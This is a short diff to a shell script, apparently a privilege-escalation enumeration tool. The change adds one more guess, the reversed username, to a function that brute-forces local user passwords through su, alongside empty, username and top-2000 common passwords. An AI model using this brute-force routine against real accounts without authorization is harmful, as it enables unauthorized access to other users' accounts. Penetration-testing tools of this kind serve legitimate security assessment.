@@ -281,6 +281,7 @@ su_brute_user_num (){
   TRIES=$2
   su_try_pwd $USER "" &    #Try without password
   su_try_pwd $USER $USER & #Try username as password
+  su_try_pwd $USER `echo $USER | rev 2>/dev/null` & #Try reverse username as password
   for i in `seq $TRIES`; do 
     su_try_pwd $USER `echo $top2000pwds | cut -d " " -f $i` & #Try TOP TRIES of passwords (by default 2000)
     sleep 0.007 # To not overload the system
